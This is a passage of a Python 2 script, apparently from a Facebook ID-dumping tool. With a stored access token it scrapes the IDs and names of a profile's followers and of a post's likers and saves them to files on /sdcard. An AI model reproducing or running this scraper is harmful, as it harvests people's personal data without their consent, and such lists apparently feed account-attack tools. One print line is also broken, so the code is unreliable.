        asw = raw_input(' [?] limit id   : ')
        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (idt, asw, __cindy__))
        id = []
        x = json.loads(pok.text)
        ah = ('.out' + '.txt').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print ('\r' + w + ' [*] total dump : %s ' % str(len(id))),
            sys.stdout.flush()
            time.sleep(0.001)

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] successful dump id from total followers' % (N, H, N))
        print (47 * '-')
        raw_input('%s [%s PRESS ENTER TO DOWNLOAD%s ]' % (K, O, K))
        ptv = "10"
        os.system('cat .out.txt | grep '+ ptv +' >> /sdcard/FLWRIDS.txt')
        os.system('rm -rf .out.txt')
        print (' %sYour %sFile %sSave %s/sdcard/FLWRIDS.txt%s' (N, warna1, warna2, warna3, O))
        raw_input(' %sPress %sEnter %sTo %sBack%s' % (N, warna1, warna2, warna3, H))
        juttex_menu()
    except IOError:
        print ('\n %s[%s!%s] Failed dump id Please Enter Public id' % (N, M, N))
        os.remove(ah)
        time.sleep(1)
        juttex_menu()


def postex():
    try:
        __cindy__ = open('access_token.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ('\n %s[%s!%s] token/cookies invalid' % (N, M, N))
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        log_menu()

    os.system('clear')
    print (logo)
    print ('')
    print (' %sDump ids %s From %sTimeline Post %sLikes%s' % (N, warna1, warna2, warna3, N))
    print (47*'-')
    try:
        idt = raw_input('\n [?] id posts   : ')
        asw = raw_input(' [?] limit id   : ')
        kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s' % (idt, asw, __cindy__))
        id = []
        x = json.loads(kon.text)
        ikeh = ('.out' + '.txt').replace(' ', '_')
        ys = open(ikeh, 'w')
        for a in x['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print ('\r' + w + ' [*] total dump : %s ' % str(len(id))),
            sys.stdout.flush()
            time.sleep(0.001)

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] successful dump id from like post' % (N, H, N))
        print (47 * '-')
        raw_input('%s [%s PRESS ENTER TO DOWNLOAD%s ]' % (K, O, K))
        pft = "10"
        os.system('cat .out.txt | grep '+ pft +' >> /sdcard/postids.txt')
        os.system('rm -rf .out.txt')
        print (' %sYour %sFile %sSave %s/sdcard/postids.txt%s' % (N, warna1, warna2, warna3, H))
        raw_input(' %sPress %sEnter %sTo %sBack%s' % (N, warna1, warna2, warna3, K))
        juttex_menu()
    except IOError:
        print ('\n %s[%s!%s] Failed dump id %sPlease Enter Timeline Post%s' % (N, M, N))
        os.remove(ikeh)
        time.sleep(1)
        juttex_menu()


if __name__ == '__main__':
    wg() 

